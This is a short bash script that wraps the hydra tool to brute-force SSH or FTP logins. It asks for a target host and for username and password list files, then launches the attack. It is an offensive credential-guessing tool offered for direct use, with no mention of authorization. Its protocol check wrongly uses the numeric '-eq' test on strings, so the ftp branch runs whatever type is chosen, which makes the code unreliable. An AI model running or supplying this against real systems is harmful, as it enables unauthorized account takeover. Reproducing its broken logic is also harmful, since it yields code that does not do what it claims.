#!/bin/bash
clear
BLUE="\e[94m"
RED="\e[31m"
STOP="\e[0m"
printf "${BLUE}"
echo
echo "========================================================"
echo
echo -en "Enter Domain/IP for Bruteforcing: "
read  target

echo -en "Select the Bruteforce type(ssh/ftp): "
read type
 
echo -en "Type the Path for user file: "
read userfile

echo -en "Type the Path for password file: "
read passfile

if [[  $type -eq ftp  ]]; then

	hydra -L $userfile -P $passfile ftp://$target -t 4 

	elif [[ $type -eq ssh ]]; then

    hydra -L $userfile -P $passfile ssh://$target -t 4 
else
	echo "Wrong Choice....."

    echo "=========================================================="


fi
printf "${STOP}"

exit 0;
